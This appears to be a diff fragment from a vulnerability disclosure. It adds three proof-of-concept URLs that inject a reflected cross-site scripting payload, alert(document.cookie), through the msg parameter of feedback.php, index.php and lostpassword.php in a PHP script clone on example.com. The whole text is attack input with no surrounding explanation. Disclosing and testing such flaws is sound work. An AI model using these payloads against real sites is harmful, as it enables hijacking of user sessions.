@@ -1,0 +1,2 @@
+http://www.example.com/hotscriptsclonetypephpscript/feedback.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/hotscriptsclonetypephpscript/index.php?id=1&amp;msg=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;  http://www.example.com/hotscriptsclonetypephpscript/lostpassword.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
